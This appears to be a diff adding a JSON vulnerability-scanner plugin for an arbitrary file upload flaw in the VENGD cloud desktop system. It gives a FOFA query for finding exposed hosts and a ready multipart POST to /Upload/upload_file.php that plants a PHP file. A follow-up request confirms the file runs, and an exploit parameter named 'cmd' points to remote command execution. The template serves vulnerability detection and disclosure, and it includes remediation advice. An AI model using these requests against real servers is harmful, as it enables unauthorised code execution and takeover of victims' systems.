@@ -1,0 +1,109 @@
+{
+  "Name": "VENGD upload-file Arbitrary file upload",
+  "Description": "The Next Generation cloud Desktop system (Vengd) is a leading Desktop virtualization product based on NGD(Next Generation Desktop) architecture in China. There is an arbitrary file upload vulnerability, which attackers can use to write files, upload malicious files to the server, and obtain the server permissions.Causes the entire device or server to be controlled.",
+  "Product": "VENGD",
+  "Homepage": "https://www.vesystem.com/",
+  "DisclosureDate": "2021-04-10",
+  "Author": "r4v3zn",
+  "FofaQuery": "title=\"和信下一代云桌面VENGD\" || body=\"和信下一代云桌面\"",
+  "Level": "3",
+  "Impact": "<p>The Next Generation cloud Desktop system (Vengd) is a leading Desktop virtualization product based on NGD(Next Generation Desktop) architecture in China. There is an arbitrary file upload vulnerability, which attackers can use to write files, upload malicious files to the server, and obtain the server permissions.Causes the entire device or server to be controlled.<br></p>",
+  "VulType": "file upload",
+  "CveID": "",
+  "CNNVD": "",
+  "CNVD": "",
+  "CVSS": "9.8",
+  "is0day": false,
+  "Recommendation": "<p>1、请用户联系对应厂商修复漏洞。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
+  "References": [
+    "https://forum.butian.net/share/80"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "Name": "cmd",
+      "Type": "input",
+      "Value": "whoami"
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "header": {
+          "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv",
+          "Accept": "image/avif,image/webp,image/apng,image/*,*/*;q=0.8",
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36"
+        },
+        "data": "------WebKitFormBoundaryfcKRltGv\nContent-Disposition: form-data; name=\"file\"; filename=\"1.php\"\nContent-Type: image/avif\n\n<?php echo(\"21232f297a57a5a743894a0e4a801fc3\") ?>\n------WebKitFormBoundaryfcKRltGv--",
+        "data_type": "text",
+        "follow_redirect": true,
+        "method": "POST",
+        "uri": "/Upload/upload_file.php?l=abcdada"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "_Requst:",
+            "bz": ""
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    },{
+      "Request": {
+        "data": "",
+        "data_type": "text",
+        "follow_redirect": true,
+        "method": "GET",
+        "uri": "/Upload/abcdada/1.php"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "21232f297a57a5a743894a0e4a801fc3",
+            "bz": ""
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": null,
+  "Tags": ["file uoload","rce"],
+  "CVEIDs": null,
+  "CVSSScore": "9.8",
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
